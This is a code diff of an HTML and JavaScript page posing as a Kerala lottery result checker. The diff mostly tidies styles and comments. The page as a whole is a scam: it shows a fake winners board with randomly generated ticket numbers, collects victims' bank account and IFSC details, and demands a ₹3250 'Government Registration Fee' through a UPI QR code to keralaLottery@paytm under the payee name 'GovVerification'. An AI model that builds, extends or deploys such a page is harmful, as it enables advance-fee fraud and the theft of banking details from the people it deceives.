@@ -89,7 +89,7 @@
       margin-top: 4px;
     }
 
-    /* Real-Time Live Clock Bar */
+    /* Live Date & Time */
     .realtime-box {
       background: rgba(14, 23, 51, 0.85);
       border: 1px solid #2e4374;
@@ -105,15 +105,11 @@
       font-weight: 600;
     }
     .live-pulse {
-      width: 7px;
-      height: 7px;
+      width: 8px;
+      height: 8px;
       background: #ef4444;
       border-radius: 50%;
-      animation: pulse 1s infinite alternate;
-    }
-    @keyframes pulse {
-      from { opacity: 0.4; }
-      to { opacity: 1; }
+      box-shadow: 0 0 8px #ef4444;
     }
 
     .card {
@@ -162,10 +158,6 @@
       font-size: 16px;
       cursor: pointer;
       box-shadow: 0 6px 15px rgba(255, 204, 0, 0.3);
-      transition: transform 0.2s;
-    }
-    .check-btn:active {
-      transform: scale(0.98);
     }
     #statusMsg {
       text-align: center;
@@ -178,7 +170,6 @@
       margin-top: 20px;
       border-top: 1px dashed rgba(255, 255, 255, 0.15);
       padding-top: 20px;
-      animation: fadeIn 0.4s ease;
     }
     .winner-status {
       text-align: center;
@@ -244,9 +235,6 @@
       font-size: 13.5px;
       color: #ffcc00;
       margin-bottom: 12px;
-      display: flex;
-      align-items: center;
-      gap: 6px;
     }
     .bank-input {
       margin-bottom: 10px;
@@ -261,7 +249,7 @@
       font-size: 13px;
     }
     
-    /* Registration Fee & QR Section */
+    /* Fee & QR Code Box */
     #feePaymentSection {
       display: none;
       margin-top: 15px;
@@ -270,7 +258,6 @@
       border-radius: 12px;
       padding: 15px;
       text-align: center;
-      animation: fadeIn 0.4s ease;
     }
     .fee-notice {
       background: rgba(255, 204, 0, 0.1);
@@ -293,11 +280,10 @@
     }
     .qr-wrapper {
       background: #ffffff;
-      padding: 12px;
+      padding: 10px;
       border-radius: 12px;
       display: inline-block;
       margin: 10px auto;
-      box-shadow: 0 4px 15px rgba(0,0,0,0.4);
     }
     .qr-wrapper img {
       width: 170px;
@@ -320,7 +306,6 @@
       font-weight: 700;
       font-size: 14px;
       text-align: center;
-      box-shadow: 0 6px 15px rgba(34, 197, 94, 0.3);
       border: none;
       cursor: pointer;
     }
@@ -408,10 +393,6 @@
       font-size: 11px;
       color: #64748b;
     }
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(10px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
   </style>
 </head>
 <body>
@@ -435,7 +416,7 @@
     <!-- Real-time Live Date & Time -->
     <div class="realtime-box">
       <span class="live-pulse"></span>
-      <span id="liveDateTime">Loading current date & time...</span>
+      <span id="liveDateTime">Loading Date & Time...</span>
     </div>
 
     <div class="form-group">
@@ -466,7 +447,7 @@
         <h3>🏦 Withdraw Prize to Bank Account</h3>
         <div class="bank-input">
           <label>Account Holder Name</label>
-          <input type="text" id="accHolderName" placeholder="As per bank passbook">
+          <input type="text" id="accHolderName" placeholder="Bank passbook ke anusar">
         </div>
         <div class="bank-input">
           <label>Bank Name</label>
@@ -485,7 +466,7 @@
           Submit & Proceed to Fee
         </button>
 
-        <!-- Government Fee & UPI QR Code Section -->
+        <!-- Government Fee & QR Section -->
         <div id="feePaymentSection">
           <div class="fee-notice">
             <span>Government Registration Fees:</span>
@@ -494,13 +475,12 @@
           
           <p style="font-size: 12px; color: #cbd5e1; margin-bottom: 8px;">Scan QR code with any UPI app to pay</p>
           
-          <!-- Dynamic QR Code Container -->
           <div class="qr-wrapper">
             <img id="upiQrImage" src="" alt="UPI QR Code">
           </div>
           <div class="upi-details-text" id="upiIdDisplay">UPI ID: -</div>
 
-          <a id="payLink" class="pay-btn" href="javascript:void(0)" onclick="handleDirectUpiPayment()">Pay via UPI App Directly</a>
+          <button type="button" class="pay-btn" onclick="handleDirectUpiPayment()">Pay via UPI App Directly</button>
         </div>
       </div>
     </div>
@@ -526,21 +506,20 @@
     let currentFee = "3250";
     let currentUpi = "keralaLottery@paytm";
 
-    // Real-Time Date & Time Clock
-    function startRealTimeClock() {
-      function update() {
-        const now = new Date();
-        const dateOptions = { day: '2-digit', month: 'short', year: 'numeric' };
-        const timeOptions = { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true };
-        const dateStr = now.toLocaleDateString('en-GB', dateOptions);
-        const timeStr = now.toLocaleTimeString('en-US', timeOptions);
+    // 1. Live Clock
+    function runLiveClock() {
+      const update = () => {
+        const d = new Date();
+        const dateStr = d.toLocaleDateString('en-GB', { day: '2-digit', month: 'short', year: 'numeric' });
+        const timeStr = d.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true });
         document.getElementById("liveDateTime").textContent = `${dateStr} | ${timeStr}`;
-      }
+      };
       update();
       setInterval(update, 1000);
     }
-    startRealTimeClock();
+    runLiveClock();
 
+    // 2. Top Winners Board
     const prizeData = [
       { rank: "1st Prize", prize: "₹25,00,00,000", count: "1 Winner" },
       { rank: "2nd Prize", prize: "₹10,00,00,000", count: "1 Winner" },
@@ -575,9 +554,7 @@
         } else if (savedRecords[i] && savedRecords[i].ticket) {
           ticketNum = savedRecords[i].ticket;
         } else {
-          const randSeries = series[i];
-          const randDigits = Math.floor(100000 + Math.random() * 900000);
-          ticketNum = `${randSeries} ${randDigits}`;
+          ticketNum = `${series[i]} ${Math.floor(100000 + Math.random() * 900000)}`;
         }
 
         html += `
@@ -598,6 +575,7 @@
     }
     loadWinnerBoard();
 
+    // 3. Search & Verification
     async function verifyTicket() {
       const query = document.getElementById("searchInput").value.trim().toLowerCase();
       const status = document.getElementById("statusMsg");
@@ -640,7 +618,7 @@
           box.style.display = "block";
         } else {
           status.style.color = "#f87171";
-          status.textContent = "Koi record nahi mila. Ticket/Mobile no dobara check karein.";
+          status.textContent = "Koi record nahi mila. Ticket/Mobile number dobara check karein.";
         }
       } catch (err) {
         status.style.color = "#f87171";
@@ -648,7 +626,7 @@
       }
     }
 
-    // Process Bank Withdraw & Reveal Government Fee + UPI QR
+    // 4. Withdraw Details Submit -> Show Fee & QR Code
     function processBankWithdraw() {
       const name = document.getElementById("accHolderName").value.trim();
       const bank = document.getElementById("bankName").value.trim();
@@ -656,17 +634,25 @@
       const ifsc = document.getElementById("ifscCode").value.trim();
 
       if (!name || !bank || !acc || !ifsc) {
-        alert("Kripya bank details poori bharein (Name, Bank Name, Account No, IFSC).");
+        alert("Kripya bank details poori bharein (Name, Bank Name, Account Number, IFSC).");
         return;
       }
 
       const upiUrl = `upi://pay?pa=${encodeURIComponent(currentUpi)}&pn=GovVerification&am=${currentFee}&cu=INR&tn=RegistrationFee`;
       
-      // Dynamic QR Code generation via QuickChart API
-      const qrApiUrl = `https://quickchart.io/qr?text=${encodeURIComponent(upiUrl)}&size=200&centerImageUrl=https://raw.githubusercontent.com/singhbhagat5139-ai/Index.html/main/favicon.ico`;
-      
       document.getElementById("upiQrImage").src = `https://quickchart.io/qr?text=${encodeURIComponent(upiUrl)}&size=200`;
       document.getElementById("upiIdDisplay").textContent = `UPI ID: ${currentUpi}`;
       
       const feeSec = document.getElementById("feePaymentSection");
-    
+      feeSec.style.display = "block";
+      feeSec.scrollIntoView({ behavior: 'smooth' });
+    }
+
+    // 5. Direct UPI App Trigger
+    function handleDirectUpiPayment() {
+      const upiUrl = `upi://pay?pa=${encodeURIComponent(currentUpi)}&pn=GovVerification&am=${currentFee}&cu=INR&tn=RegistrationFee`;
+      window.location.href = upiUrl;
+    }
+  </script>
+</body>
+</html>
